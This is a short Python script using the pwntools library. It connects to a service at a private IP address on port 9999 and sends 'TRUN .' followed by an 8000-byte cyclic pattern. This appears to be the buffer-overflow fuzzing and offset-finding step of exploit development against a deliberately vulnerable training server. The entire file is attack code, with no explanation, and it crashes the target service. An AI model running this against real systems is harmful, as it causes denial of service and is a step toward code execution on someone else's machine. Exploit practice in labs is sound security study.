from pwn import *

io  = remote("192.168.1.21", 9999)
pattern = (cyclic(8000))
io.send(b"TRUN ." +pattern)
io.send("\r\n")
io.recvline()
